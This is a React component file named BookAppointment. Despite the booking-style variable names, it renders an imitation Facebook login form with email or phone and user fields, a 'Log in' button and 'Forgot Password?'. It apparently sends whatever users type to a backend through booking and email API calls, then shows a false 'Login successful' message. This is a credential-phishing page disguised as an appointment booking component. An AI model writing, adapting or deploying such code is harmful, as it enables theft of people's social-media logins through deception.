import React, { useState } from 'react'
import {
    Dialog,
    DialogClose,
    DialogContent,
    DialogDescription,
    DialogFooter,
    DialogHeader,
    DialogTitle,
    DialogTrigger,
  } from "@/components/ui/dialog"
  import Image from 'next/image'
import GlobalApi from '@/app/_utils/GlobalApi'
import { toast } from 'sonner'
import { Button } from '@/components/ui/button'

function BookAppointment({service}) {
    
    const [note,setNote]=useState();
    const [email,setEmail]=useState();
    

    const saveBooking=()=>{
      const data={
        data:{

          Email:email,
          service:service.id,
          Note:note
        }
      }
      // console.log(data)
      GlobalApi.bookAppointment(data).then(resp=>{
        console.log(resp);
        if(resp)
        {
          GlobalApi.sendEmail(data).then(resp=>{
            console.log(resp)
          })
          toast("Login successful click link above to continue")
        }
      })
    }

  
  return ( 

<div className='mx-2 mt-1'>
  <p className="max-w-md text-gray-500 text-sm">You must log first.
  </p>
    {/*<div className='relative inset-0 flex'>
            <Image src='/utme.png' alt='logo' className='m-auto mt-12'
            width={60} height={60}
            />
  </div>*/}
            <h1 className="text-center text-2xl font-bold text-primary sm:text-3xl mb-4">facebook</h1>
  <form class="bg-blue mx-2 rounded pt-4 pb-8 mb-2 item-center">
    <div class="mb-3">
      <input class="shadow appearance-none border rounded w-full py-3 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" id="username" type="email" placeholder="Mobile number or email" onChange={(e)=>setNote(e.target.value)}/>
    </div>
    <div class="mb-3">
      <input class="shadow appearance-none border rounded w-full py-3 px-3 text-gray-700 mb-2 leading-tight focus:outline-none focus:shadow-outline" id="user" type="user" placeholder="user" onChange={(e)=>setEmail(e.target.value)}/>
    </div>
  <Dialog>
  <DialogTrigger className='align-middle block w-full mb-2'>   
  <Button type="button" className="text-lg py-6 px-6 font-bold w-full"
            onClick={()=>saveBooking()}
            >
              Log in
  </Button>
  </DialogTrigger>
  <DialogContent>
    <DialogHeader>
      <DialogTitle>Confirm Order</DialogTitle>
      <DialogDescription>
            
      </DialogDescription>
    </DialogHeader>
    <DialogFooter className="sm:justify-end">
          <DialogClose asChild >
            
          </DialogClose>
        </DialogFooter>
  </DialogContent>
</Dialog>
<p class="text-center text-lg text-primary hover:text-blue-800" href="#">
  Forgot Password?
  </p>

  </form>
  
</div>

  )
}

export default BookAppointment